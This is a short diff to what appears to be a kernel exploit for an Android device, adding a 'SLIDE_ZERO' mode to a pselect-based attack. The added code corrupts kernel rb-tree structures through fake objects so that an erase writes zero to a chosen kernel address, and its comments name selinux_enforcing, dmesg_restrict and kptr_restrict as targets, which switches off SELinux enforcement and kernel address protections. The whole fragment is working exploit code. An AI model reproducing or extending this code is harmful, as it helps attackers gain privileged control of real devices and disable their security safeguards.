@@ -871,6 +871,25 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                     "right=0 left=%016llx (*(fake_fops+0x90)=fake_fops+0x80)\n",
                     (unsigned long long)tree_pc,
                     (unsigned long long)tree_l);
+          } else if (env_flag("MODE4_SLIDE_ZERO", 0)) {
+            /*
+             * SLIDE_ZERO: write VALUE=0 to DATAONLY_TARGET using the
+             * PROVEN SLIDE mechanism (tree_pc=0, tree_left=target).
+             * The erase writes *target = 0. Parent=NULL → change_child
+             * updates root->rb_node (harmless scratch). For
+             * selinux_enforcing=0, dmesg_restrict=0, kptr_restrict=0.
+             */
+            tree_pc = 0;
+            tree_r = 0;
+            tree_l = (uint64_t)pselect_write_target();
+            pi_parent = 0;
+            pi_right = 0;
+            pi_left = 0;
+            stack_lock = fake_lock;
+            stack_prio = 3;
+            stack_deadline = 0;
+            pr_info("stack mode4 SLIDE_ZERO: *%016llx = 0\n",
+                    (unsigned long long)tree_l);
           } else if (env_flag("MODE4_SLIDE", 0)) {
             /*
              * Aristotle SLIDE oracle (kallsyms-measured for CPH2521):
